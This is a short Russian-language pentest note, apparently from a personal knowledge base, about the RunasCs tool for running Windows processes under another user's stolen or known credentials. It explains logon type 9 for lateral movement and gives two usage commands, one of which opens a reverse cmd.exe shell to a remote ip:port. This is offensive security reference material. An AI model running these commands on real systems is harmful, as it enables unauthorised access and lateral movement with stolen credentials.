#tool #windows #powershell #AD

> Это **пентест-утилита для запуска процессов от имени другого пользователя в Windows**, обычно с украденными или известными учетными данными.

Когда нельзя выйти/зайти под другим пользователем, или не хочется палиться, то этот инструмент очень сильно помогает

## Типы Logon, которые он может использовать

Основные:
- Interactive (2)
- Network (3)
- Batch (4)
- Service (5)
- NewCredentials (9)

Самый интересный:
**Logon type 9 — NewCredentials**
Это позволяет:
- запускать процесс локально
- использовать другие credentials только для network access
Это основа многих lateral movement техник.

## Использование

```powershell
./RunasCs.exe <domain>\<user> pass cmd.exe -r <ip>:<port>
```

Использование logon type 9 (NewCredentials)
```powershell
./RunasCs.exe <domain>\<user> pass cmd.exe -l 9
```

Инструмент не убирает Logon, он просто превращает creds в token


